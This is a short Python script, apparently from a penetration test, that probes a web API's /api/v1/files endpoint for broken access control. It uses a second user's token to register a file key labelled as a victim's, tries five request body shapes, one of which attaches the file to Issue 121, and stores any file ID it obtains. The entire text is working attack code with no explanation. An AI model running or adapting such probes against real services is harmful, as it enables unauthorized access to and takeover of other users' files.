import json,subprocess,os,hashlib,base64
H=os.environ['H']; BB=os.environ['BB']
TB=open('/tmp/tok_B').read().strip()
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','60','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TB),'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
key=open('/tmp/b_key').read().strip()
md5=base64.b64encode(hashlib.md5(b"x").digest()).decode()
print("=== register shape probes (B) ===")
shapes=[
 {"file":{"file_key":key,"name":"zx-bac-victim.pdf","size":100,"type":"application/pdf"}},
 {"file":{"key":key,"name":"zx-bac-victim.pdf","size":100,"type":"application/pdf"}},
 {"files":[{"file_key":key,"name":"zx-bac-victim.pdf","size":100}]},
 {"file":{"file_key":key,"filename":"zx-bac-victim.pdf","size":100,"content_hash":md5}},
 {"file":{"file_key":key,"name":"zx-bac-victim.pdf","size":100,"content_hash":md5,"fileable_type":"Issue","fileable_id":121}},
]
for s in shapes:
    c,b=req('POST','/api/v1/files',s,tok=TB)
    print(f"  {list(s.get('file',s).keys())[:4]} -> {c} {b[:180].replace(chr(10),' ')}")
    if c in ('200','201'):
        try:
            f=json.loads(b)['files'][0]
            print(f"    ID={f['id']} creator={f.get('creator_user_id')} name={f.get('name')}")
            open('/tmp/victim_fid','w').write(str(f['id']))
        except: pass
        break
